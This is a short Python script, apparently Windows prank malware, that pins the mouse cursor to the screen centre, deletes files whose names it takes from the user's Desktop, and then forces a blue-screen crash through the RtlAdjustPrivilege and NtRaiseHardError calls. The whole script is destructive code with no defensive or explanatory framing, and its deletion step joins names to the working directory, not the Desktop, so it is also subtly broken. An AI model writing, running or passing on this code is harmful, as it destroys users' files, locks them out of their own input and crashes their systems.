import os
import ctypes
from ctypes import c_uint
from ctypes import c_int
from ctypes import c_ulong
from mouse import move
from screeninfo import get_monitors

# Getting monitor width and height
width = get_monitors()[0].width
height = get_monitors()[0].height

# Getting desktop path
desktop = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop')

# Locking cursor and deleting files
for filename in os.listdir(desktop):
    # Locking cursor
    xpos = width/2
    ypos = height/2
    move(xpos, ypos)

    # Deleting files
    file = os.path.join(os.getcwd(), filename)
    os.remove(file)

# Causing blue screen of death
nullptr = ctypes.POINTER(c_int)()

ctypes.windll.ntdll.RtlAdjustPrivilege(
    c_uint(19),
    c_uint(1),
    c_uint(0),
    ctypes.byref(c_int())
)

ctypes.windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B),
    c_ulong(0),
    nullptr,
    nullptr,
    c_uint(6),
    ctypes.byref(c_uint())
)